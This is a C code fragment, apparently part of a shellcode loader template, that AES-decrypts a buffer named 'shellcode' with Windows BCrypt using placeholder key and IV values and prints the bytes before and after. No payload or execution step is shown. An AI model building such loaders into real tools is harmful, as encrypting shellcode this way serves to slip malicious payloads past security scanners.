    BCRYPT_ALG_HANDLE hAlgAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    unsigned char key[] = { ###AES_KEY### };
    unsigned char iv[] = { ###AES_IV### };

    DWORD cbResult = 0;
    DWORD dwRet = 10;

    printf("DEBUG:Before AES:");
    for (size_t i = 0; i < sizeof(shellcode); i++) {
        printf("0x%02x,", shellcode[i]);
    }
    printf("\n\n");

    BCryptOpenAlgorithmProvider(&hAlgAes, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);

    BCryptSetProperty(hAlgAes, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    
    BCryptGenerateSymmetricKey(hAlgAes, &hKey, NULL, 0, key, sizeof(key), 0);

    BCryptDecrypt(hKey, shellcode, sizeof(shellcode), NULL, iv, sizeof(iv), shellcode, sizeof(shellcode), &cbResult, BCRYPT_BLOCK_PADDING);

    printf("DEBUG:After AES:");
    for (size_t i = 0; i < sizeof(shellcode); i++) {
        printf("0x%02x,", shellcode[i]);
    }
    printf("\n\n");

    if (NULL != hKey)
        BCryptDestroyKey(hKey);

    if (NULL != hAlgAes)
        BCryptCloseAlgorithmProvider(hAlgAes, 0);



    

